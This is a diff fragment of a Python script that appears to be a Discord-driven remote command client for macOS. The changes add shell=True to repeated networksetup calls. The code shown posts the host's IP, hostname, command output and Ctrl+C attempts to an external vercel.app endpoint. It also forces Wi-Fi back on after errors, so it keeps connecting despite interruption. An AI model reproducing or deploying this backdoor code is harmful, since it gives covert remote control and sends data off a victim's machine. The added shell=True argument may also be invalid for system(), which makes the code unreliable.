@@ -36,11 +36,11 @@ while True:
             try:
                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
             except KeyboardInterrupt:
-                system("/usr/sbin/networksetup -setairportpower en0 on")
+                system("/usr/sbin/networksetup -setairportpower en0 on", shell=True)
                 continue
             continue
         except:
-            system("/usr/sbin/networksetup -setairportpower en0 on")
+            system("/usr/sbin/networksetup -setairportpower en0 on", shell=True)
             sleep(3)
             continue
         # execute command
@@ -81,7 +81,7 @@ while True:
 #                    except KeyboardInterrupt:
 #                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
 #                    except:
-                        system("/usr/sbin/networksetup -setairportpower en0 on")
+                        system("/usr/sbin/networksetup -setairportpower en0 on", shell=True)
 
 #                       continue
                 if command.startswith("cd"):
@@ -97,7 +97,7 @@ while True:
                     except FileNotFoundError:
                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```No Such Directory```-{ip}@{hostname}")
                     except:
-                        system("/usr/sbin/networksetup -setairportpower en0 on")
+                        system("/usr/sbin/networksetup -setairportpower en0 on", shell=True)
 
                         continue
                 old_command = command
@@ -128,7 +128,7 @@ while True:
                             continue
                     continue
                 except:
-                    system("/usr/sbin/networksetup -setairportpower en0 on")
+                    system("/usr/sbin/networksetup -setairportpower en0 on", shell=True)
 
                     continue
                 if cmdout.decode() != "" and cmderr.decode() == "":
@@ -144,7 +144,7 @@ while True:
                                 continue
                         continue
                     except:
-                        system("/usr/sbin/networksetup -setairportpower en0 on")
+                        system("/usr/sbin/networksetup -setairportpower en0 on", shell=True)
 
                         continue
                 elif cmdout.decode() == "" and cmderr.decode() == "":
@@ -157,7 +157,7 @@ while True:
                                 continue
                         continue
                     except:
-                        system("/usr/sbin/networksetup -setairportpower en0 on")
+                        system("/usr/sbin/networksetup -setairportpower en0 on", shell=True)
 
                         continue
                 old_command = command
